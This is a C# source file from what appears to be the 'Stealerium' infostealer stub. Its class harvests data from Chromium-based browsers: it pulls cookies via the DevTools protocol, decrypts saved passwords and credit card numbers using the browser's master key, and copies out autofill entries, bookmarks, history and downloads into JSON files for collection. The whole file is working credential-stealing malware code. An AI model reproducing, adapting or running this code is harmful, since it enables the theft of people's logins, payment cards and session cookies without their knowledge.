using System;
using System.Collections.Generic;
using System.IO;
using System.Text.Json;
using Microsoft.Data.Sqlite;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Target.Browsers.Common.Models;
using Stealerium.Stub.Target.Browsers.Common.Encryption;
using Stealerium.Stub.Target.Browsers.Chromium;

namespace Stealerium.Stub.Target.Browsers.Common.Recovery
{
    internal abstract class ChromiumBasedRecovery : BaseBrowserRecovery
    {
        private static readonly DateTime ChromeEpoch = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);
        protected readonly CdpCookieGrabber.BrowserType BrowserType;

        protected ChromiumBasedRecovery(
            string savePath, 
            string browserName, 
            string userDataPath, 
            CdpCookieGrabber.BrowserType browserType) 
            : base(savePath, browserName, userDataPath)
        {
            BrowserType = browserType;
        }

        protected override void RecoverCookies()
        {
            try
            {
                Logging.Log($"{BrowserName} >> Starting cookie recovery via CDP");
                var cookies = CdpCookieGrabber.GetCookiesViaCdp(BrowserType).Result;
                Logging.Log($"{BrowserName} >> Found {cookies.Count} cookies");
                
                if (cookies.Count > 0)
                {
                    Counter.Cookies += cookies.Count;
                    SaveToFile(cookies, "Cookies.json");
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"{BrowserName} >> Failed to recover cookies: {ex}");
            }
        }

        protected override void RecoverPasswords()
        {
            try
            {
                var passwords = new List<BrowserPassword>();
                var loginDataPath = Path.Combine(UserDataPath, "Default", "Login Data");
                var localStatePath = Path.Combine(UserDataPath, "Local State");

                if (!File.Exists(loginDataPath) || !File.Exists(localStatePath))
                {
                    Logging.Log($"{BrowserName} >> Login Data or Local State file not found");
                    return;
                }

                // Get the master key for decryption
                var masterKey = BrowserCrypto.GetMasterKey(localStatePath);
                if (masterKey == null)
                {
                    Logging.Log($"{BrowserName} >> Failed to get master key");
                    return;
                }

                // Copy login data to temp file to avoid database lock
                var tempLoginData = Path.GetTempFileName();
                File.Copy(loginDataPath, tempLoginData, true);

                SqliteConnection conn = null;
                SqliteCommand cmd = null;
                SqliteDataReader reader = null;

                try
                {
                    conn = new SqliteConnection($"Data Source={tempLoginData}");
                    conn.Open();

                    cmd = new SqliteCommand(
                        "SELECT origin_url, username_value, password_value FROM logins", conn);
                    reader = cmd.ExecuteReader();

                    while (reader.Read())
                    {
                        var url = reader.GetString(0);
                        var username = reader.GetString(1);
                        var encryptedPassword = (byte[])reader[2];

                        var password = BrowserCrypto.DecryptPassword(masterKey, encryptedPassword);
                        if (!string.IsNullOrEmpty(password))
                        {
                            passwords.Add(new BrowserPassword
                            {
                                Url = url,
                                Username = username,
                                EncryptedPassword = password
                            });
                            Counter.Passwords++;
                        }
                    }
                }
                finally
                {
                    if (reader != null) reader.Dispose();
                    if (cmd != null) cmd.Dispose();
                    if (conn != null) conn.Dispose();
                    try { File.Delete(tempLoginData); } catch { }
                }

                if (passwords.Count > 0)
                {
                    SaveToFile(passwords, "Passwords.json");
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"{BrowserName} >> Failed to recover passwords: {ex}");
            }
        }

        protected override void RecoverBookmarks()
        {
            try
            {
                var bookmarks = new List<BrowserBookmark>();
                var bookmarksPath = Path.Combine(UserDataPath, "Default", "Bookmarks");
                
                if (!File.Exists(bookmarksPath))
                {
                    Logging.Log($"{BrowserName} >> Bookmarks file not found");
                    return;
                }

                var jsonContent = File.ReadAllText(bookmarksPath);
                JsonDocument document = null;
                try
                {
                    document = JsonDocument.Parse(jsonContent);
                    var root = document.RootElement;

                    if (root.TryGetProperty("roots", out var roots))
                    {
                        ExtractBookmarksFromNode(roots, bookmarks);
                    }

                    if (bookmarks.Count > 0)
                    {
                        Counter.Bookmarks += bookmarks.Count;
                        SaveToFile(bookmarks, "Bookmarks.json");
                    }
                }
                finally
                {
                    if (document != null) document.Dispose();
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"{BrowserName} >> Failed to recover bookmarks: {ex}");
            }
        }

        private void ExtractBookmarksFromNode(JsonElement node, List<BrowserBookmark> bookmarks)
        {
            if (node.ValueKind != JsonValueKind.Object)
                return;

            if (node.TryGetProperty("type", out var type) && type.GetString() == "url")
            {
                if (node.TryGetProperty("url", out var url) && node.TryGetProperty("name", out var name))
                {
                    bookmarks.Add(new BrowserBookmark
                    {
                        Url = url.GetString(),
                        Title = name.GetString()
                    });
                }
                return;
            }

            foreach (var property in node.EnumerateObject())
            {
                if (property.Value.ValueKind == JsonValueKind.Object || property.Value.ValueKind == JsonValueKind.Array)
                {
                    ExtractBookmarksFromNode(property.Value, bookmarks);
                }
            }
        }

        protected override void RecoverHistory()
        {
            try
            {
                var history = new List<BrowserHistoryItem>();
                var historyPath = Path.Combine(UserDataPath, "Default", "History");

                if (!File.Exists(historyPath))
                {
                    Logging.Log($"{BrowserName} >> History file not found");
                    return;
                }

                // Copy history to temp file to avoid database lock
                var tempHistory = Path.GetTempFileName();
                File.Copy(historyPath, tempHistory, true);

                SqliteConnection conn = null;
                SqliteCommand cmd = null;
                SqliteDataReader reader = null;

                try
                {
                    conn = new SqliteConnection($"Data Source={tempHistory}");
                    conn.Open();

                    cmd = new SqliteCommand(
                        @"SELECT url, title, visit_count, last_visit_time 
                          FROM urls 
                          ORDER BY last_visit_time DESC 
                          LIMIT 1000", conn);
                    reader = cmd.ExecuteReader();

                    while (reader.Read())
                    {
                        var url = reader.GetString(0);
                        var title = reader.IsDBNull(1) ? string.Empty : reader.GetString(1);
                        var visitCount = reader.GetInt32(2);
                        var lastVisitTime = reader.GetInt64(3);

                        // Convert Chrome timestamp (microseconds since 1601-01-01) to DateTime
                        var visitTime = ChromeEpoch.AddMilliseconds(lastVisitTime / 1000);

                        history.Add(new BrowserHistoryItem
                        {
                            Url = url,
                            Title = title,
                            VisitCount = visitCount,
                            VisitTime = visitTime
                        });
                        Counter.History++;
                    }
                }
                finally
                {
                    if (reader != null) reader.Dispose();
                    if (cmd != null) cmd.Dispose();
                    if (conn != null) conn.Dispose();
                    try { File.Delete(tempHistory); } catch { }
                }

                if (history.Count > 0)
                {
                    SaveToFile(history, "History.json");
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"{BrowserName} >> Failed to recover history: {ex}");
            }
        }

        protected override void RecoverAutofill()
        {
            try
            {
                var autofill = new List<BrowserAutofill>();
                var webDataPath = Path.Combine(UserDataPath, "Default", "Web Data");

                if (!File.Exists(webDataPath))
                {
                    Logging.Log($"{BrowserName} >> Web Data file not found");
                    return;
                }

                // Copy web data to temp file to avoid database lock
                var tempWebData = Path.GetTempFileName();
                File.Copy(webDataPath, tempWebData, true);

                SqliteConnection conn = null;
                SqliteCommand cmd = null;
                SqliteDataReader reader = null;

                try
                {
                    conn = new SqliteConnection($"Data Source={tempWebData}");
                    conn.Open();

                    cmd = new SqliteCommand(
                        "SELECT name, value FROM autofill", conn);
                    reader = cmd.ExecuteReader();

                    while (reader.Read())
                    {
                        var name = reader.GetString(0);
                        var value = reader.GetString(1);

                        autofill.Add(new BrowserAutofill
                        {
                            Name = name,
                            Value = value
                        });
                        Counter.AutoFill++;
                    }
                }
                finally
                {
                    if (reader != null) reader.Dispose();
                    if (cmd != null) cmd.Dispose();
                    if (conn != null) conn.Dispose();
                    try { File.Delete(tempWebData); } catch { }
                }

                if (autofill.Count > 0)
                {
                    SaveToFile(autofill, "Autofill.json");
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"{BrowserName} >> Failed to recover autofill: {ex}");
            }
        }

        protected override void RecoverCreditCards()
        {
            try
            {
                var cards = new List<BrowserCreditCard>();
                var webDataPath = Path.Combine(UserDataPath, "Default", "Web Data");
                var localStatePath = Path.Combine(UserDataPath, "Local State");

                if (!File.Exists(webDataPath) || !File.Exists(localStatePath))
                {
                    Logging.Log($"{BrowserName} >> Web Data or Local State file not found");
                    return;
                }

                // Get the master key for decryption
                var masterKey = BrowserCrypto.GetMasterKey(localStatePath);
                if (masterKey == null)
                {
                    Logging.Log($"{BrowserName} >> Failed to get master key");
                    return;
                }

                // Copy web data to temp file to avoid database lock
                var tempWebData = Path.GetTempFileName();
                File.Copy(webDataPath, tempWebData, true);

                SqliteConnection conn = null;
                SqliteCommand cmd = null;
                SqliteDataReader reader = null;

                try
                {
                    conn = new SqliteConnection($"Data Source={tempWebData}");
                    conn.Open();

                    cmd = new SqliteCommand(
                        @"SELECT card_number_encrypted, expiration_month, expiration_year, name_on_card 
                          FROM credit_cards", conn);
                    reader = cmd.ExecuteReader();

                    while (reader.Read())
                    {
                        var encryptedNumber = (byte[])reader[0];
                        var expMonth = reader.GetString(1);
                        var expYear = reader.GetString(2);
                        var cardName = reader.GetString(3);

                        var cardNumber = BrowserCrypto.DecryptPassword(masterKey, encryptedNumber);
                        if (!string.IsNullOrEmpty(cardNumber))
                        {
                            cards.Add(new BrowserCreditCard
                            {
                                Number = cardNumber,
                                ExpMonth = expMonth,
                                ExpYear = expYear,
                                Name = cardName
                            });
                            Counter.CreditCards++;
                        }
                    }
                }
                finally
                {
                    if (reader != null) reader.Dispose();
                    if (cmd != null) cmd.Dispose();
                    if (conn != null) conn.Dispose();
                    try { File.Delete(tempWebData); } catch { }
                }

                if (cards.Count > 0)
                {
                    SaveToFile(cards, "CreditCards.json");
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"{BrowserName} >> Failed to recover credit cards: {ex}");
            }
        }

        protected override void RecoverDownloads()
        {
            try
            {
                var downloads = new List<BrowserDownload>();
                var historyPath = Path.Combine(UserDataPath, "Default", "History");

                if (!File.Exists(historyPath))
                {
                    Logging.Log($"{BrowserName} >> History file not found");
                    return;
                }

                // Copy history to temp file to avoid database lock
                var tempHistory = Path.GetTempFileName();
                File.Copy(historyPath, tempHistory, true);

                SqliteConnection conn = null;
                SqliteCommand cmd = null;
                SqliteDataReader reader = null;

                try
                {
                    conn = new SqliteConnection($"Data Source={tempHistory}");
                    conn.Open();

                    cmd = new SqliteCommand(
                        @"SELECT target_path, tab_url, total_bytes, start_time, end_time 
                          FROM downloads 
                          ORDER BY start_time DESC 
                          LIMIT 1000", conn);
                    reader = cmd.ExecuteReader();

                    while (reader.Read())
                    {
                        var targetPath = reader.IsDBNull(0) ? string.Empty : reader.GetString(0);
                        var url = reader.IsDBNull(1) ? string.Empty : reader.GetString(1);
                        var totalBytes = reader.IsDBNull(2) ? 0 : reader.GetInt64(2);
                        var startTime = reader.GetInt64(3);
                        var endTime = reader.GetInt64(4);

                        // Convert Chrome timestamp (microseconds since 1601-01-01) to DateTime
                        var startDateTime = ChromeEpoch.AddMilliseconds(startTime / 1000);
                        var endDateTime = ChromeEpoch.AddMilliseconds(endTime / 1000);

                        downloads.Add(new BrowserDownload
                        {
                            TargetPath = targetPath,
                            Url = url,
                            TotalBytes = totalBytes,
                            StartTime = startDateTime,
                            EndTime = endDateTime
                        });
                        Counter.Downloads++;
                    }
                }
                finally
                {
                    if (reader != null) reader.Dispose();
                    if (cmd != null) cmd.Dispose();
                    if (conn != null) conn.Dispose();
                    try { File.Delete(tempHistory); } catch { }
                }

                if (downloads.Count > 0)
                {
                    SaveToFile(downloads, "Downloads.json");
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"{BrowserName} >> Failed to recover downloads: {ex}");
            }
        }
    }
}
